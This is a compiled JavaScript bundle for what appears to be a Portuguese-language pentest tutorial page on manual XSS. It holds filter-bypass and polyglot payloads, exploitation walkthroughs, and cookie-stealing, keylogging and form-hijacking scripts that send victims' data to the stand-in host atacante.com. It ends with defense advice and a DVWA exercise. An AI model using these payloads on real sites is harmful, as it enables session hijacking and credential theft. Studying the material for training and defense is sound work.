import{j as e}from"./index-BofgBnE-.js";import{P as s}from"./PageContainer-B5fVeNJT.js";import{A as r}from"./AlertBox-B_JSQKUS.js";import{C as o}from"./CodeBlock-CaRmq6e3.js";import{C as a}from"./CommandTable-Ck2MUBHP.js";import{O as i}from"./OutputBlock-CumPmTZt.js";import{T as t,P as c}from"./PracticeBox-BgVTSfiK.js";function g(){return e.jsxs(s,{title:"XSS — Cross-Site Scripting (manual)",subtitle:"Reflected, Stored, DOM-based. Polyglots, bypass de filtros e roubo de sessão.",difficulty:"intermediario",timeToRead:"18 min",children:[e.jsx("h2",{children:"Os 3 tipos de XSS"}),e.jsx(a,{title:"Reflected / Stored / DOM",variations:[{cmd:"Reflected",desc:"Payload vai no request, retorna na response sem persistência.",output:"Ex: ?q=<script>alert(1)<\/script>"},{cmd:"Stored",desc:"Payload é salvo no banco e exibido a outros usuários.",output:"Comentário, perfil, mensagem privada."},{cmd:"DOM-based",desc:"JavaScript do client-side processa input perigoso.",output:"Ex: location.hash → innerHTML sem sanitização."}]}),e.jsx("h2",{children:"Detecção rápida"}),e.jsx(t,{path:"~",lines:[{comment:"primeiro: o servidor reflete o input?",cmd:"curl -s 'https://app.local/search?q=ABCwallyXYZ' | grep -o 'ABCwallyXYZ'",out:"ABCwallyXYZ",outType:"info"},{comment:"agora teste se quebra HTML",cmd:`curl -s 'https://app.local/search?q=<x>"' | grep -E '<x>|&lt;x&gt;'`,out:`<x>"  ← reflete RAW (sem encode)
ou
&lt;x&gt;&quot;  ← está sendo encodado (mais difícil)`,outType:"warning"}]}),e.jsx("h2",{children:"Payloads — do mais simples ao polyglot"}),e.jsx(o,{language:"html",title:"payloads de XSS clássico",code:`<!-- 1) Mais clássico -->
<script>alert(1)<\/script>

<!-- 2) Sem <script> (CSP comum bloqueia) -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details ontoggle=alert(1) open>
<marquee onstart=alert(1)>

<!-- 3) Quando aspas são bloqueadas -->
<script>alert(/XSS/)<\/script>
<svg onload=alert\`1\`>

<!-- 4) Quando parênteses são bloqueados -->
<script>alert\`1\`<\/script>
<svg onload=alert\`xss\`>

<!-- 5) Sair de atributo (input em value=) -->
"><script>alert(1)<\/script>
" autofocus onfocus="alert(1)
' onmouseover='alert(1)

<!-- 6) Sair de string JS (input em var x = "...") -->
";alert(1);//
\\";alert(1);//

<!-- 7) Polyglot universal (cobre vários contextos) -->
jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/<\/scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e

<!-- 8) Encoded para passar filtros simples -->
<svg/onload=eval(atob('YWxlcnQoMSk='))>      (alert(1) em b64)
<a href="javascript&colon;alert(1)">click</a>
<a href="javas&#99;ript:alert(1)">click</a>`}),e.jsx("h2",{children:"Caso 1: Reflected na URL"}),e.jsx(t,{path:"~",lines:[{cmd:`curl -s 'https://app.local/search?q=teste' | grep -A1 'class="results"'`,out:`<h2>Resultados para: teste</h2>
<div class="results">
  <p>Nenhum resultado.</p>
</div>`,outType:"info"},{comment:"tenta payload simples",cmd:"curl -s 'https://app.local/search?q=<script>alert(1)<\/script>' | grep '<script>alert'",out:"<h2>Resultados para: <script>alert(1)<\/script></h2>",outType:"warning"},{comment:"agora cole o link no browser, dispara",cmd:'firefox "https://app.local/search?q=<script>alert(1)<\/script>"',out:"(janela do alert(1) aparece no navegador da vítima)",outType:"error"}]}),e.jsx("h2",{children:"Caso 2: DOM-based"}),e.jsx(o,{language:"html",title:"página vulnerável típica",code:`<!-- página: /welcome.html -->
<!DOCTYPE html>
<html>
<body>
  <div id="msg"></div>
  <script>
    // Lê o hash da URL e joga no innerHTML — sink perigosa!
    const name = location.hash.substring(1);
    document.getElementById("msg").innerHTML = "Bem-vindo, " + name;
  <\/script>
</body>
</html>`}),e.jsx(t,{path:"~",lines:[{comment:"payload no fragment (#) — não vai no servidor!",cmd:'firefox "https://app.local/welcome.html#<img src=x onerror=alert(1)>"',out:"(alert dispara do JS do client)",outType:"error"}]}),e.jsxs("p",{children:["XSS DOM-based é especialmente perigoso porque ",e.jsx("strong",{children:"o payload nunca chega ao servidor"}),". Logs do WAF/SOC não veem nada. Só análise client-side detecta."]}),e.jsx("h2",{children:"Caso 3: Roubo de sessão (real impact)"}),e.jsx(o,{language:"html",title:"payload que envia o cookie ao atacante",code:`<!-- Coloque em campo Stored XSS (comentário, perfil, etc.) -->

<!-- Forma 1: Image -->
<img src=x onerror="
  fetch('https://atacante.com/steal?c='+encodeURIComponent(document.cookie))
">

<!-- Forma 2: fetch silencioso -->
<script>
  fetch('https://atacante.com/log', {
    method: 'POST',
    body: JSON.stringify({
      cookie: document.cookie,
      url: location.href,
      ua: navigator.userAgent,
      ls: JSON.stringify(localStorage),
      ss: JSON.stringify(sessionStorage)
    }),
    mode: 'no-cors'
  });
<\/script>

<!-- Forma 3: keylogger -->
<script>
  document.addEventListener('keypress', e => {
    fetch('https://atacante.com/k?k='+e.key, {mode:'no-cors'});
  });
<\/script>

<!-- Forma 4: mudar form action para roubar credenciais -->
<script>
  document.querySelector('form#login').action = 'https://atacante.com/phish';
<\/script>`}),e.jsx(t,{path:"~",lines:[{comment:"no atacante: subir listener simples para pegar os cookies",cmd:"python3 -m http.server 80 --bind 0.0.0.0",out:"Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...",outType:"info"},{comment:"depois que vítima visita a página com payload Stored",cmd:"(no log do server)",out:'192.168.1.55 - - [03/Apr/2026 13:30:14] "GET /steal?c=session%3Dabc123def456%3B%20user_id%3D99 HTTP/1.1" 200 -',outType:"warning"},{comment:"decodar e usar",cmd:`python3 -c 'import urllib.parse;print(urllib.parse.unquote("session%3Dabc123def456%3B%20user_id%3D99"))'`,out:"session=abc123def456; user_id=99",outType:"error"}]}),e.jsx("h2",{children:"Bypass de filtros comuns"}),e.jsx(a,{title:"Quando o servidor 'sanitiza'",variations:[{cmd:"Filtro: '<script' bloqueado",desc:"Use tags alternativas.",output:"<svg onload=alert(1)>"},{cmd:"Filtro: 'on*' bloqueado",desc:"Use eventos exotéricos ou href.",output:"<a href='javascript:alert(1)'>x</a>"},{cmd:"Filtro: alert() bloqueado",desc:"Use confirm/prompt/print/eval.",output:"<svg onload=confirm(1)>"},{cmd:'Filtro: "javascript:" bloqueado',desc:"URL encode parcial.",output:"java&#0009;script:alert(1)"},{cmd:"CSP estrito (script-src 'self')",desc:"Procure JSONP, dangling markup, scriptless XSS.",output:"Use <link rel=stylesheet> ou <meta http-equiv>."},{cmd:"WAF detecta keywords",desc:"Encode em parts (tag splitting).",output:"<scr<script>ipt>alert(1)</scr<\/script>ipt>"}]}),e.jsx("h2",{children:"Ferramentas auxiliares"}),e.jsx(t,{path:"~",lines:[{comment:"XSStrike — fuzzer de XSS",cmd:"xsstrike -u 'https://app.local/search?q=test'",out:`        XSStrike v3.1.5

[~] Checking for DOM vulnerabilities
[+] Reflections found: 3
[~] Analysing reflections
[+] Context analysis: HTML
[+] WAF Status: Offline
[+] Generating payloads
[+] Progress: 100% [===============>]
[+] Payload: <svg/onload=confirm()>
[+] Efficiency: 100%
[+] Confidence: 10`,outType:"info"},{comment:"dalfox — CLI scanner moderno",cmd:"dalfox url 'https://app.local/search?q=test' --silence",out:`[POC][R][GET] https://app.local/search?q=<svg/onload=alert(1)>
  CWE: CWE-79
  Severity: HIGH
  Reflected: True
  Mining: q
  Type: REFLECTED
  Bypass: -`,outType:"warning"},{comment:"BeEF — controle remoto via XSS",cmd:"beef-xss",out:`[INFO] Listener: http://0.0.0.0:3000
[INFO] Hook URL: http://192.168.1.42:3000/hook.js
Use a UI: http://127.0.0.1:3000/ui/panel`,outType:"default"}]}),e.jsxs("p",{children:["Veja a página dedicada: ",e.jsx("a",{href:"#/beef",children:e.jsx("strong",{children:"BeEF — Browser Exploitation"})}),"."]}),e.jsx("h2",{children:"Boas práticas de defesa"}),e.jsx(i,{label:"checklist anti-XSS server-side",type:"default",children:`☐ Encode na SAÍDA, sempre. Use o template engine (Jinja2 autoescape, React JSX, etc.).
☐ Nunca use innerHTML / document.write com input externo.
☐ Use textContent em vez de innerHTML quando só precisa do texto.
☐ Cookie de sessão com HttpOnly + Secure + SameSite=Lax/Strict.
☐ Content-Security-Policy:
   default-src 'self'; script-src 'self' 'nonce-XXX'; object-src 'none';
   frame-ancestors 'none'; base-uri 'self';
☐ X-Content-Type-Options: nosniff
☐ Sanitize HTML que precisa ser RICH (DOMPurify no client, bleach no Python).
☐ Em DOM: tratar location.hash, location.search, postMessage como "tainted".`}),e.jsx(c,{title:"Quebre o DVWA — XSS Reflected (Low → High)",goal:"Conseguir alert(1) em todos os 3 níveis de dificuldade do módulo XSS Reflected.",steps:["Suba o DVWA local (docker run -d -p 8080:80 vulnerables/web-dvwa).","Login admin/password, vá em XSS Reflected.","Low: ?name=<script>alert(1)<\/script>","Medium: filtra <script> case sensitive — use <ScRipt> ou <svg onload=alert(1)>","High: regex bloqueia <script tags inteiras — use <svg/onload=alert(1)> ou <img src=x onerror=alert(1)>"],command:`# Confirme cada nível com curl
curl -s "http://localhost:8080/vulnerabilities/xss_r/?name=<script>alert(1)<\/script>" -b 'PHPSESSID=...; security=low' | grep '<script>alert'

curl -s "http://localhost:8080/vulnerabilities/xss_r/?name=<ScRipt>alert(1)<\/ScRipt>" -b 'PHPSESSID=...; security=medium' | grep '<ScRipt>'

curl -s "http://localhost:8080/vulnerabilities/xss_r/?name=<svg/onload=alert(1)>" -b 'PHPSESSID=...; security=high' | grep '<svg/onload'`,expected:"(em todos os 3, no browser, o alert(1) deve disparar)",verify:"No browser com DevTools aberto, console deve mostrar 'alert' chamado e nenhum erro de CSP."}),e.jsx(r,{type:"danger",title:"Use só em alvos autorizados",children:"Roubar cookie de sessão de outra pessoa é interceptação de comunicação privada — crime em quase todo lugar. Pratique apenas em DVWA, PortSwigger Labs, HTB, THM ou plataformas com consentimento explícito."})]})}export{g as default};
